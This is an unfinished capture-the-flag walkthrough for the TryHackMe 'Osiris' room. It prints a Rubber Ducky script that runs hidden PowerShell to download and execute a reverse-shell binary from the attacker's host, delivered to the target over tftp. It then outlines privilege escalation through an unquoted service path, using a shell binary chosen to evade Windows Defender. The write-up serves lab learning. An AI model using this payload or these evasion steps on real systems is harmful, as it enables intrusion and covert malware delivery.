# Osiris - WIP

https://tryhackme.com/room/osiris

Rated "INSANE"

The machine won't respond to scans, but as the description says, tftp is open. This first requires that you have a tftp client, on the attack box install using `sudo apt install tftp`, then connect using `tftp <targetip>`, however first we need a script.

To exploit rubberducky, I used the script below. This uses [reverse_ssh](https://github.com/NHAS/reverse_ssh), my revshell of choice, which is typically ignored by windows defender and other protection mechanisms.

```
DELAY 1000
GUI r
DELAY 200
STRING powershell -W hidden
ENTER
DELAY 3000
STRING Invoke-WebRequest http://10.10.80.36:1234/client.exe -outfile c:\windows\temp\c.exe
ENTER
DELAY 3000
STRING c:\windows\temp\c.exe
ENTER
```

I put the above in a file named `script`, then connected over tftp and ran `put script` to put it in place. For this to work, a local webserver on port 1234 allows client.exe to be downloaded, and I got a shell connection in seconds.

On the machine as `alcrez` the first flag is in their desktop folder.

To privesc to system, a few things can be picked up from local enumeration:

- there is a folder at c:\scripts, that contains a vbs file and a cmd file. The vbs file seems to do nothing, but appears to relate to a local service (details next), while the cmd file downloads a zip file to c:\temp, extracts it, then force copies its contents to `c:\program files\ivpn client`.
- there is a local service named `ivpn service` that executes the ivpn client. notably this service uses an unquoted path, and so if you could get an exe named ivpn into program files or into the ivpn folder, you could hijack the service.
- the service runs as system, but as the user alcrez you have the rights to restart the service.

Presumably the vbs script that seems to do nothing triggers whatever is needed to run the extract and copy operation. This can be tested by putting any arbitary file into c:\temp, running the vbs, and observing that file is now inside the program files vpn folder. The path to privesc is thus: create a valid service binary that will give you a rev shell and avoids defender, put that in c:\temp, run the vbs script and finally restart the service to trigger the binary.
